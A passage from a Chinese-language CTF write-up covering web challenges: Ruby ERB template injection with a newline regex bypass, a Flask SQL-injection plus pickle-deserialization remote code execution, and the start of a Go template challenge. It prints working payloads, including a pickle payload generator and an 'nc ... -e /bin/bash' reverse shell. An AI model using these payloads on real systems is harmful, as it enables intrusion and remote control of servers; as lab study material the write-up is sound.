value=&quot;Submit&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;glow&quot;&gt;&lt;%= @neon %&gt;&lt;/h1&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\n<p>里面的 &lt;%=@neon%&gt; 可以初步分析判断为 ssti 注入，然后再看 neon.rb</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class NeonControllers &lt; Sinatra::Base</span><br><span class=\"line\"></span><br><span class=\"line\">  configure do</span><br><span class=\"line\">    set :views, &quot;app/views&quot;</span><br><span class=\"line\">    set :public_dir, &quot;public&quot;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  get &#x27;/&#x27; do</span><br><span class=\"line\">    @neon = &quot;Glow With The Flow&quot;</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  post &#x27;/&#x27; do</span><br><span class=\"line\">    if params[:neon] =~ /^[0-9a-z ]+$/i</span><br><span class=\"line\">      @neon = ERB.new(params[:neon]).result(binding)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      @neon = &quot;Malicious Input Detected&quot;</span><br><span class=\"line\">    end</span><br><span class=\"line\">    erb :&#x27;index&#x27;</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>里面有一个分别为 get 和 post，如果你使用 post 方法的话会进行正则匹配是否为数字和字母如果不是直接等于</p>\n<p>Malicious Input Detected</p>\n<p>如果是的情况下就会在输出一下这个变量，查资料得到这个正则匹配可以通过匹配 %0a 来达到绕过手段也就是说使用 \\n 就能绕过和 php 一样，那么直接在 index.erb 里面输入 1%0a&lt;/h1&gt;&lt;%25=open ('|cat f*').read ()%25&gt;&lt;h1 &gt; 这样就能达到任意命令执行的效果</p>\n<p><img data-src=\"/pic/image-20231208163006608.png\" alt=\"image-20231208163006608\" /></p>\n<p>使用 &lt;%= File.open ('flag.txt').read %&gt; 也能得到 flag 但是需要进行 urlencode</p>\n<h3 id=\"cop\"><a class=\"anchor\" href=\"#cop\">#</a> C.O.P</h3>\n<p>这个代码是 python 写的打开后能发现这个代码 models.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class shop(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    @staticmethod</span><br><span class=\"line\">    def select_by_id(product_id):</span><br><span class=\"line\">        return query_db(f&quot;SELECT data FROM products WHERE id=&#x27;&#123;product_id&#125;&#x27;&quot;, one=True)</span><br></pre></td></tr></table></figure></p>\n<p>还有 database.py 里面的代码如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import g</span><br><span class=\"line\">from application import app</span><br><span class=\"line\">from sqlite3 import dbapi2 as sqlite3</span><br><span class=\"line\">import base64, pickle</span><br><span class=\"line\"></span><br><span class=\"line\">def connect_db():</span><br><span class=\"line\">    return sqlite3.connect(&#x27;cop.db&#x27;, isolation_level=None)</span><br><span class=\"line\">    </span><br><span class=\"line\">def get_db():</span><br><span class=\"line\">    db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class=\"line\">    if db is None:</span><br><span class=\"line\">        db = g._database = connect_db()</span><br><span class=\"line\">        db.row_factory = sqlite3.Row</span><br><span class=\"line\">    return db</span><br><span class=\"line\"></span><br><span class=\"line\">def query_db(query, args=(), one=False):</span><br><span class=\"line\">    with app.app.app_context():</span><br><span class=\"line\">        cur = get_db().execute(query, args)</span><br><span class=\"line\">        rv = [dict((cur.description[idx][0], value) \\</span><br><span class=\"line\">            for idx, value in enumerate(row)) for row in cur.fetchall()]</span><br><span class=\"line\">        return (next(iter(rv[0].values())) if rv else None) if one else rv</span><br><span class=\"line\"></span><br><span class=\"line\">class Item:</span><br><span class=\"line\">\tdef __init__(self, name, description, price, image):</span><br><span class=\"line\">\t\tself.name = name</span><br><span class=\"line\">\t\tself.description = description</span><br><span class=\"line\">\t\tself.image = image</span><br><span class=\"line\">\t\tself.price = price</span><br><span class=\"line\"></span><br><span class=\"line\">def migrate_db():</span><br><span class=\"line\">    items = [</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt&#x27;, &#x27;Get our new pickle shirt!&#x27;, &#x27;23&#x27;, &#x27;/static/images/pickle_shirt.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt 2&#x27;, &#x27;Get our (second) new pickle shirt!&#x27;, &#x27;27&#x27;, &#x27;/static/images/pickle_shirt2.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Dill Pickle Jar&#x27;, &#x27;Literally just a pickle&#x27;, &#x27;1337&#x27;, &#x27;/static/images/pickle.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Branston Pickle&#x27;, &#x27;Does this even fit on our store?!?!&#x27;, &#x27;7.30&#x27;, &#x27;/static/images/branston_pickle.jpg&#x27;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    </span><br><span class=\"line\">    with open(&#x27;schema.sql&#x27;, mode=&#x27;r&#x27;) as f:</span><br><span class=\"line\">        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br><span class=\"line\">        get_db().cursor().executescript(f.read().format(*list(shop)))</span><br></pre></td></tr></table></figure></p>\n<p>这个 sql 语句能直接产生 sql 注入，还有就是这个 pickle (泡菜) 看到 pickle 我们就能想到 python 的反序列化</p>\n<p>先去页面注入尝试一下</p>\n<p><img data-src=\"/pic/image-20231210134014962.png\" alt=\"image-20231210134014962\" /></p>\n<p>发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;order by 1--+不报错</span><br><span class=\"line\">1&#x27;order by 2--+直接报错</span><br></pre></td></tr></table></figure></p>\n<p>那直接使用 sqlmap 跑一次试试，发现使用的是 SQLite 数据库，那么我们就无法直接进行读取文件了，因为 sqlite 无法直接 --os-shell，这些表里也没有其他内容，那么进攻点就还有 pickle 了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br></pre></td></tr></table></figure></p>\n<p>按照这个思路的话可以构造执行 shell 命令拼接 sql 语句，无效化前面的商品，利用 union select 能够直接将反序列化的代码传入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;cp flag.txt application/static/.&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure></p>\n<p>需要注意的点是这段代码需要使用 linux 运行，因为 windows 运行的 base64 编码后和 linux 的不一样</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows:gASVOAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">linux:gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br></pre></td></tr></table></figure></p>\n<p>然后利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">或者&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg== &#x27;--+</span><br></pre></td></tr></table></figure></p>\n<p>在访问 /static/flag.txt 即可得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;nc 172.25.36.114 8888 -e /bin/bash&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure></p>\n<p>在使用相同的办法直接进行反弹 shell，注意这样只能在本地才行</p>\n<h3 id=\"renderquest\"><a class=\"anchor\" href=\"#renderquest\">#</a> RenderQuest</h3>\n<p>很棒的一题，这题让我理解了一下 golang 的模板渲染，首先查看 main.go 代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;encoding/json&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;html/template&quot;</span><br><span class=\"line\">\t&quot;io&quot;</span><br><span class=\"line\">\t&quot;net/http&quot;</span><br><span class=\"line\">\t&quot;os&quot;</span><br><span class=\"line\">\t&quot;os/exec&quot;</span><br><span class=\"line\">\t&quot;path/filepath&quot;</span><br><span class=\"line\">\t&quot;strings&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">const WEB_PORT = &quot;1337&quot;</span><br><span class=\"line\">const TEMPLATE_DIR = &quot;./templates&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">type LocationInfo struct &#123;</span><br><span class=\"line\">\tIpVersion     int     `json:&quot;ipVersion&quot;`</span><br><span class=\"line\">\tIpAddress     string  `json:&quot;ipAddress&quot;`</span><br><span class=\"line\">\tLatitude      float64 `json:&quot;latitude&quot;`</span><br><span class=\"line\">\tLongitude     float64 `json:&quot;longitude&quot;`</span><br><span class=\"line\">\tCountryName   string  `json:&quot;countryName&quot;`</span><br><span class=\"line\">\tCountryCode   string  `json:&quot;countryCode&quot;`</span><br><span class=\"line\">\tTimeZone      string  `json:&quot;timeZone&quot;`</span><br><span class=\"line\">\tZipCode       string  `json:&quot;zipCode&quot;`</span><br><span class=\"line\">\tCityName      string  `json:&quot;cityName&quot;`</span><br><span class=\"line\">\tRegionName    string  `json:&quot;regionName&quot;`</span><br><span class=\"line\">\tContinent     string  `json:&quot;continent&quot;`</span><br><span class=\"line\">\tContinentCode string  `json:&quot;continentCode&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type MachineInfo struct &#123;</span><br><span class=\"line\">\tHostname      string</span><br><span class=\"line\">\tOS            string</span><br><span class=\"line\">\tKernelVersion string</span><br><span class=\"line\">\tMemory        string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type RequestData struct &#123;</span><br><span class=\"line\">\tClientIP     string</span><br><span class=\"line\">\tClientUA     string</span><br><span class=\"line\">\tServerInfo   MachineInfo</span><br><span class=\"line\">\tClientIpInfo LocationInfo `json:&quot;location&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) &#123;</span><br><span class=\"line\">\tresp, err := http.Get(endpointURL)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer resp.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif resp.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbody, err := io.ReadAll(resp.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar locationInfo LocationInfo</span><br><span class=\"line\">\tif err := json.Unmarshal(body, &amp;locationInfo); err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn &amp;locationInfo, nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func isSubdirectory(basePath, path string) bool &#123;</span><br><span class=\"line\">\trel, err := filepath.Rel(basePath, path)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn false</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readFile(filepath string, basePath string) (string, error) &#123;</span><br><span class=\"line\">\tif !isSubdirectory(basePath, filepath) &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;Invalid filepath&quot;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdata, err := os.ReadFile(filepath)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(data), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readRemoteFile(url string) (string, error) &#123;</span><br><span class=\"line\">\tresponse, err := http.Get(url)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer response.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif response.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcontent, err := io.ReadAll(response.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn string(content), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getIndex(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\thttp.Redirect(w, r, &quot;/render?page=index.tpl&quot;, http.StatusMovedPermanently)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getTpl(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\tvar page string = r.URL.Query().Get(&quot;page&quot;)</span><br><span class=\"line\">\tvar remote string = r.URL.Query().Get(&quot;use_remote&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif page == &quot;&quot; &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData := &amp;RequestData&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserIPCookie, err := r.Cookie(&quot;user_ip&quot;)</span><br><span class=\"line\">\tclientIP := &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err == nil &#123;</span><br><span class=\"line\">\t\tclientIP = userIPCookie.Value</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tclientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserAgent := r.Header.Get(&quot;User-Agent&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData.ClientIP = clientIP</span><br><span class=\"line\">\treqData.ClientUA = userAgent</span><br><span class=\"line\">\treqData.ClientIpInfo = *locationInfo</span><br><span class=\"line\">\treqData.ServerInfo.Hostname = reqData.FetchServerInfo(&quot;hostname&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.OS = reqData.FetchServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d &#x27;\\&quot;&#x27; -f 2&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.KernelVersion = reqData.FetchServerInfo(&quot;uname -r&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.Memory = reqData.FetchServerInfo(&quot;free -h | awk &#x27;/^Mem/&#123;print $2&#125;&#x27;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar tmplFile string</span><br><span class=\"line\"></span><br><span class=\"line\">\tif remote == &quot;true&quot; &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readRemoteFile(page)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readFile(TEMPLATE_DIR+&quot;/&quot;+page, &quot;./&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = tmpl.Execute(w, reqData)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\tmux := http.NewServeMux()</span><br><span class=\"line\"></span><br><span class=\"line\">\tmux.HandleFunc(&quot;/&quot;, getIndex)</span><br><span class=\"line\">\tmux.HandleFunc(&quot;/render&quot;, getTpl)</span><br><span class=\"line\">\tmux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(&quot;Server started at port &quot; + WEB_PORT)</span><br><span class=\"line\">\thttp.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>其他的不看光看调用包就可以找到我们需要的漏洞，import 了一个 os 并且在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 